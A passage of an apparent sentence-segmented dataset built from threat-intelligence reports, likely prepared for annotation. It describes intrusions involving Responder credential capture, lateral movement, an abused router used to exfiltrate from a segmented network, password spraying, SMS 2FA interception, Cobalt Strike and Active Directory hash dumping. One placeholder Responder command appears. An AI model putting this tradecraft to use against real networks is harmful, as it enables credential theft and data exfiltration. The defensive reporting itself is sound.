        "index": 1977
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S84",
        "text": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:\n",
        "type": "",
        "report": "r-773",
        "line": 84,
        "index": 1978
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S85",
        "text": "[Responder file path] -i [IP address] -rPv\n",
        "type": "",
        "report": "r-773",
        "line": 85,
        "index": 1979
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S86",
        "text": "Several days later, the attacker started to move laterally originating from this host.",
        "type": "",
        "report": "r-773",
        "line": 86,
        "index": 1980
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S87",
        "text": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.\n",
        "type": "",
        "report": "r-773",
        "line": 87,
        "index": 1981
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S88",
        "text": "After acquiring the login credentials, the actor started to move laterally from workstations to server hosts.",
        "type": "",
        "report": "r-773",
        "line": 88,
        "index": 1982
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S89",
        "text": "Typical lateral movement methods were employed, using Windows commands.",
        "type": "",
        "report": "r-773",
        "line": 89,
        "index": 1983
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S90",
        "text": "First, a network connection with a remote host was established using the command \u201cnet use\u201d.\n",
        "type": "",
        "report": "r-773",
        "line": 90,
        "index": 1984
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S91",
        "text": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).\n",
        "type": "",
        "report": "r-773",
        "line": 91,
        "index": 1985
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S92",
        "text": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "type": "",
        "report": "r-773",
        "line": 92,
        "index": 1986
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S93",
        "text": "The enterprise network under attack was divided into two segments: corporate (a network on which computers had internet access) and restricted (a network on which computers hosted sensitive data and had no internet access).",
        "type": "",
        "report": "r-773",
        "line": 93,
        "index": 1987
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S94",
        "text": "According to corporate policies, no transfer of information was allowed between these two segments.",
        "type": "",
        "report": "r-773",
        "line": 94,
        "index": 1988
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S95",
        "text": "In other words, the two segments were meant to be completely separated.",
        "type": "",
        "report": "r-773",
        "line": 95,
        "index": 1989
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S96",
        "text": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "type": "",
        "report": "r-773",
        "line": 96,
        "index": 1990
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S97",
        "text": "Among the compromised machines were those used by the administrators of the enterprise\u2019s IT infrastructure.",
        "type": "",
        "report": "r-773",
        "line": 97,
        "index": 1991
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S98",
        "text": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "type": "",
        "report": "r-773",
        "line": 98,
        "index": 1992
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S99",
        "text": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.\n",
        "type": "",
        "report": "r-773",
        "line": 99,
        "index": 1993
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S100",
        "text": "However, since directly routing traffic between the segments was not possible, the attackers couldn\u2019t use their standard malware set to exfiltrate data from the restricted segment to the C2.\n",
        "type": "",
        "report": "r-773",
        "line": 100,
        "index": 1994
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S101",
        "text": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "type": "",
        "report": "r-773",
        "line": 101,
        "index": 1995
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S102",
        "text": "The router was a virtual machine running CentOS to route traffic between several network interfaces based on predefined rules.\n",
        "type": "",
        "report": "r-773",
        "line": 102,
        "index": 1996
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S103",
        "text": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "type": "",
        "report": "r-773",
        "line": 103,
        "index": 1997
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S104",
        "text": "Next, the attackers logged in to the web interface using a privileged root account.",
        "type": "",
        "report": "r-773",
        "line": 104,
        "index": 1998
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S105",
        "text": "It\u2019s unknown how the attackers were able to obtain the credentials for that account, but it\u2019s possible the credentials were saved in one of the infected system\u2019s browser password managers.\n",
        "type": "",
        "report": "r-773",
        "line": 105,
        "index": 1999
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S106",
        "text": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.\n",
        "type": "",
        "report": "r-773",
        "line": 106,
        "index": 2000
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S107",
        "text": "Several days after that, on July 10, 2020, the attackers connected to the router via SSH and set up the PuTTy PSCP (the PuTTY Secure Copy client) utility on one of the infected machines.",
        "type": "",
        "report": "r-773",
        "line": 107,
        "index": 2001
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S108",
        "text": "This utility was used to upload malware to the router VM.",
        "type": "",
        "report": "r-773",
        "line": 108,
        "index": 2002
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S109",
        "text": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "type": "",
        "report": "r-773",
        "line": 109,
        "index": 2003
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S110",
        "text": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "type": "",
        "report": "r-773",
        "line": 110,
        "index": 2004
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S111",
        "text": "New connection layout after attacker\u2019s intrusion\n",
        "type": "",
        "report": "r-773",
        "line": 111,
        "index": 2005
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S112",
        "text": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.\n",
        "type": "",
        "report": "r-773",
        "line": 112,
        "index": 2006
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S113",
        "text": "Hardcoded proxy address in the malware\n",
        "type": "",
        "report": "r-773",
        "line": 113,
        "index": 2007
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S114",
        "text": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "type": "",
        "report": "r-773",
        "line": 114,
        "index": 2008
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S115",
        "text": "An analysis of these commands shows that the attackers tried to reconfigure traffic routing using the route command.",
        "type": "",
        "report": "r-773",
        "line": 115,
        "index": 2009
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S116",
        "text": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "type": "",
        "report": "r-773",
        "line": 116,
        "index": 2010
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S117",
        "text": "On September 27, the attackers started removing all traces of their activity from the router, using the logrotate utility to set up automatic deletion of log files.",
        "type": "",
        "report": "r-773",
        "line": 117,
        "index": 2011
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S118",
        "text": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "type": "",
        "report": "r-773",
        "line": 118,
        "index": 2012
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S119",
        "text": "They used a custom tunneling tool to achieve this.",
        "type": "",
        "report": "r-773",
        "line": 119,
        "index": 2013
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S120",
        "text": "The tool receives four parameters: client IP address, client port, server IP address and server port.",
        "type": "",
        "report": "r-773",
        "line": 120,
        "index": 2014
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S121",
        "text": "The tool offers basic functionality, forwarding client traffic to the server.",
        "type": "",
        "report": "r-773",
        "line": 121,
        "index": 2015
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S122",
        "text": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "type": "",
        "report": "r-773",
        "line": 122,
        "index": 2016
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S123",
        "text": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:\n",
        "type": "",
        "report": "r-773",
        "line": 123,
        "index": 2017
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S124",
        "text": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "type": "",
        "report": "r-773",
        "line": 124,
        "index": 2018
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S125",
        "text": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.\n",
        "type": "",
        "report": "r-773",
        "line": 125,
        "index": 2019
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S126",
        "text": "Execution of malware without parameters\n",
        "type": "",
        "report": "r-773",
        "line": 126,
        "index": 2020
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S127",
        "text": "However, if this application is executed with specific command line parameters, it runs an alternate, malicious function.",
        "type": "",
        "report": "r-773",
        "line": 127,
        "index": 2021
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S128",
        "text": "According to our telemetry, the actor executed this application with six parameters:\n",
        "type": "",
        "report": "r-773",
        "line": 128,
        "index": 2022
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S129",
        "text": "Also, if the number of command line parameters is greater than six, the malware jumps into a malicious routine.",
        "type": "",
        "report": "r-773",
        "line": 129,
        "index": 2023
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S130",
        "text": "The malware also checks the length of the second argument \u2013 if it\u2019s less than 29 characters, it terminates the execution.",
        "type": "",
        "report": "r-773",
        "line": 130,
        "index": 2024
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S131",
        "text": "When the parameter checking procedure has passed successfully, the malware starts to decrypt its next payload.\n",
        "type": "",
        "report": "r-773",
        "line": 131,
        "index": 2025
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S132",
        "text": "The embedded payload gets decrypted via XOR, where each byte from the end of the payload gets applied to the preceding byte.",
        "type": "",
        "report": "r-773",
        "line": 132,
        "index": 2026
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S133",
        "text": "Next, the XORed blob receives the second command line argument that\u2019s provided (in this case S0RMM-50QQE-F65DN-DCPYN-5QEQA).",
        "type": "",
        "report": "r-773",
        "line": 133,
        "index": 2027
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S134",
        "text": "The malware can accept more command line arguments, and depending on its number it runs differently.",
        "type": "",
        "report": "r-773",
        "line": 134,
        "index": 2028
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S135",
        "text": "For example, it can also receive proxy server addresses with the \u201c-p\u201d option.\n",
        "type": "",
        "report": "r-773",
        "line": 135,
        "index": 2029
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S136",
        "text": "When the decrypted in-memory payload is executed, it compares the header of the configuration data passed with the string \u201c0x8406\u201d in order to confirm its validity.",
        "type": "",
        "report": "r-773",
        "line": 136,
        "index": 2030
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S137",
        "text": "The payload opens a given file (in this example %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it to the remote server.",
        "type": "",
        "report": "r-773",
        "line": 137,
        "index": 2031
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S138",
        "text": "When the malware uploads data to the C2 server, it uses HTTP POST requests with two parameters named \u2018fr\u2019 and \u2018fp\u2019:\n",
        "type": "",
        "report": "r-773",
        "line": 138,
        "index": 2032
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S0",
        "text": "In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.",
        "type": "",
        "report": "r-786",
        "line": 0,
        "index": 2033
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S1",
        "text": "The objective in these cases appear to be stealing sensitive data from the victim\u2019s networks.\n",
        "type": "",
        "report": "r-786",
        "line": 1,
        "index": 2034
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S2",
        "text": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "type": "",
        "report": "r-786",
        "line": 2,
        "index": 2035
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S3",
        "text": "These credentials are used in a credential stuffing or password spraying attack against the victim\u2019s remote services, such as webmail or other internet reachable mail services.",
        "type": "",
        "report": "r-786",
        "line": 3,
        "index": 2036
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S4",
        "text": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "type": "",
        "report": "r-786",
        "line": 4,
        "index": 2037
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S5",
        "text": "Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.",
        "type": "",
        "report": "r-786",
        "line": 5,
        "index": 2038
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S6",
        "text": "As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.",
        "type": "",
        "report": "r-786",
        "line": 6,
        "index": 2039
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S7",
        "text": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "type": "",
        "report": "r-786",
        "line": 7,
        "index": 2040
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S8",
        "text": "With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",
        "type": "",
        "report": "r-786",
        "line": 8,
        "index": 2041
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S9",
        "text": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "type": "",
        "report": "r-786",
        "line": 9,
        "index": 2042
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S10",
        "text": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "type": "",
        "report": "r-786",
        "line": 10,
        "index": 2043
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S11",
        "text": "Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.",
        "type": "",
        "report": "r-786",
        "line": 11,
        "index": 2044
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S12",
        "text": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "type": "",
        "report": "r-786",
        "line": 12,
        "index": 2045
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S13",
        "text": "Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.",
        "type": "",
        "report": "r-786",
        "line": 13,
        "index": 2046
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S14",
        "text": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "type": "",
        "report": "r-786",
        "line": 14,
        "index": 2047
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S15",
        "text": "If the victim\u2019s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",
        "type": "",
        "report": "r-786",
        "line": 15,
        "index": 2048
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S16",
        "text": "The adversary is typically able to perform all the steps described above within one day.",
        "type": "",
        "report": "r-786",
        "line": 16,
        "index": 2049
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S17",
        "text": "During this process, the adversary identifies data of interest from the network of the victim.",
        "type": "",
        "report": "r-786",
        "line": 17,
        "index": 2050
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S18",
        "text": "This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.",
        "type": "",
        "report": "r-786",
        "line": 18,
        "index": 2051
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S19",
        "text": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "type": "",
        "report": "r-786",
        "line": 19,
        "index": 2052
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S20",
        "text": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "type": "",
        "report": "r-786",
        "line": 20,
        "index": 2053
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S21",
        "text": "After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.",
        "type": "",
        "report": "r-786",
        "line": 21,
        "index": 2054
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S22",
        "text": "At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.",
        "type": "",
        "report": "r-786",
        "line": 22,
        "index": 2055
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S23",
        "text": "But this isn\u2019t done consistently across their engagements.\n",
        "type": "",
        "report": "r-786",
        "line": 23,
        "index": 2056
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S24",
        "text": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "type": "",
        "report": "r-786",
        "line": 24,
        "index": 2057
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S25",
        "text": "The more recent intrusions took place in 2019 at companies in the aviation industry.",
        "type": "",
        "report": "r-786",
        "line": 25,
        "index": 2058
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S26",
        "text": "The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry.",
        "type": "",
        "report": "r-786",
        "line": 26,
        "index": 2059
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S27",
        "text": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "type": "",
        "report": "r-786",
        "line": 27,
        "index": 2060
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S28",
        "text": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "type": "",
        "report": "r-786",
        "line": 28,
        "index": 2061
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S29",
        "text": "They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.",
        "type": "",
        "report": "r-786",
        "line": 29,
        "index": 2062
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S30",
        "text": "Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.",
        "type": "",
        "report": "r-786",
        "line": 30,
        "index": 2063
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S31",
        "text": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "type": "",
        "report": "r-786",
        "line": 31,
        "index": 2064
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S32",
        "text": "And attempted logins came from a relative small set of IP-addresses.",
        "type": "",
        "report": "r-786",
        "line": 32,
        "index": 2065
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S33",
        "text": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "type": "",
        "report": "r-786",
        "line": 33,
        "index": 2066
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S34",
        "text": "In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there.\n",
        "type": "",
        "report": "r-786",
        "line": 34,
        "index": 2067
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S35",
        "text": "In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.",
        "type": "",
        "report": "r-786",
        "line": 35,
        "index": 2068
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S36",
        "text": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "type": "",
        "report": "r-786",
        "line": 36,
        "index": 2069
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S37",
        "text": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "type": "",
        "report": "r-786",
        "line": 37,
        "index": 2070
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S38",
        "text": "From this portal it was possible to launch the web-based VPN.",
        "type": "",
        "report": "r-786",
        "line": 38,
        "index": 2071
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S39",
        "text": "The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account\u2019s primary or alternate phone number.",
        "type": "",
        "report": "r-786",
        "line": 39,
        "index": 2072
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S40",
        "text": "It was possible to configure an alternate phone number for the logged in user account at the company portal.",
        "type": "",
        "report": "r-786",
        "line": 40,
        "index": 2073
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S41",
        "text": "The adversary used this opportunity to configure an alternate phone number controlled by the adversary.",
        "type": "",
        "report": "r-786",
        "line": 41,
        "index": 2074
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S42",
        "text": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "type": "",
        "report": "r-786",
        "line": 42,
        "index": 2075
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S43",
        "text": "However, they also made a mistake during this process within one incident.",
        "type": "",
        "report": "r-786",
        "line": 43,
        "index": 2076
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S44",
        "text": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "type": "",
        "report": "r-786",
        "line": 44,
        "index": 2077
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S45",
        "text": "However the European owner of the account received a text message with Simplified Chinese characters on the primary phone number in the middle of the night Eastern European Time (EET).",
        "type": "",
        "report": "r-786",
        "line": 45,
        "index": 2078
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S46",
        "text": "NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser\u2019s language settings used during the authentication flow.",
        "type": "",
        "report": "r-786",
        "line": 46,
        "index": 2079
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S47",
        "text": "Thus the 2FA code was sent with supporting Chinese text.",
        "type": "",
        "report": "r-786",
        "line": 47,
        "index": 2080
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S48",
        "text": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "type": "",
        "report": "r-786",
        "line": 48,
        "index": 2081
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S49",
        "text": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:\n",
        "type": "",
        "report": "r-786",
        "line": 49,
        "index": 2082
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S50",
        "text": "If the user account doesn\u2019t have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admin\u2019s usernames.",
        "type": "",
        "report": "r-786",
        "line": 50,
        "index": 2083
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S51",
        "text": "To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.",
        "type": "",
        "report": "r-786",
        "line": 51,
        "index": 2084
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S52",
        "text": "The built-in Windows quser-command to show logged on users is also heavily used by them.",
        "type": "",
        "report": "r-786",
        "line": 52,
        "index": 2085
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S53",
        "text": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "type": "",
        "report": "r-786",
        "line": 53,
        "index": 2086
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S54",
        "text": "The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.",
        "type": "",
        "report": "r-786",
        "line": 54,
        "index": 2087
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S55",
        "text": "In other cases, the adversary moved laterally to another system with a domain admin logged in.",
        "type": "",
        "report": "r-786",
        "line": 55,
        "index": 2088
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S56",
        "text": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "type": "",
        "report": "r-786",
        "line": 56,
        "index": 2089
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S57",
        "text": "The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command:\n",
        "type": "",
        "report": "r-786",
        "line": 57,
        "index": 2090
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S58",
        "text": "Note: the adversary renamed ntdsaudit.exe to msadcs.exe.\n",
        "type": "",
        "report": "r-786",
        "line": 58,
        "index": 2091
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S59",
        "text": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:\n",
        "type": "",
        "report": "r-786",
        "line": 59,
        "index": 2092
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S60",
        "text": "Both ntdsutil and esentutl are by default installed on a domain controller.",
        "type": "",
        "report": "r-786",
        "line": 60,
        "index": 2093
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S61",
        "text": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "type": "",
        "report": "r-786",
        "line": 61,
        "index": 2094
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S62",
        "text": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "type": "",
        "report": "r-786",
        "line": 62,
        "index": 2095
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S63",
        "text": "The files and directories found on various systems of a victim match with DSInternals version 2.16.1.",
        "type": "",
        "report": "r-786",
        "line": 63,
        "index": 2096
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S64",
        "text": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "type": "",
        "report": "r-786",
        "line": 64,
        "index": 2097
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S65",
        "text": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "type": "",
        "report": "r-786",
        "line": 65,
        "index": 2098
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S66",
        "text": "The adversary installs a hackers best friend during the intrusion: Cobalt Strike.",
        "type": "",
        "report": "r-786",
        "line": 66,
        "index": 2099
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S67",
        "text": "Cobalt Strike is a framework designed for adversary simulation intended for penetration testers and red teams.",
        "type": "",
        "report": "r-786",
        "line": 67,
        "index": 2100
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S68",
        "text": "It has been widely adopted by malicious threats as well.\n",
        "type": "",
        "report": "r-786",
        "line": 68,
        "index": 2101
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S69",
        "text": "The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner.",
        "type": "",
        "report": "r-786",
        "line": 69,
        "index": 2102
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S70",
        "text": "At least the following three versions of Cobalt Strike have been in use by the adversary:\n",
        "type": "",
        "report": "r-786",
        "line": 70,
        "index": 2103
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S71",
        "text": "Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.",
        "type": "",
        "report": "r-786",
        "line": 71,
        "index": 2104
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S72",
        "text": "This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog \u201cIdentifying Cobalt Strike team servers in the wild\u201d.",
        "type": "",
        "report": "r-786",
        "line": 72,
        "index": 2105
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S73",
        "text": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "type": "",
        "report": "r-786",
        "line": 73,
        "index": 2106
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S74",
        "text": "Because of this, historic information was available during this investigation.",
        "type": "",
        "report": "r-786",
        "line": 74,
        "index": 2107
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S75",
        "text": "Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.",
        "type": "",
        "report": "r-786",
        "line": 75,
        "index": 2108
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S76",
        "text": "If a match was found, the configuration of the Cobalt Strike team server was analysed.",
        "type": "",
        "report": "r-786",
        "line": 76,
        "index": 2109
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S77",
        "text": "This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.\n",
        "type": "",
        "report": "r-786",
        "line": 77,
        "index": 2110
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S78",
        "text": "The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.",
        "type": "",
        "report": "r-786",
        "line": 78,
        "index": 2111
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S79",
        "text": "An example of the creation of such a scheduled task by the adversary:\n",
        "type": "",
        "report": "r-786",
        "line": 79,
        "index": 2112
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S80",
        "text": "The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.",
        "type": "",
        "report": "r-786",
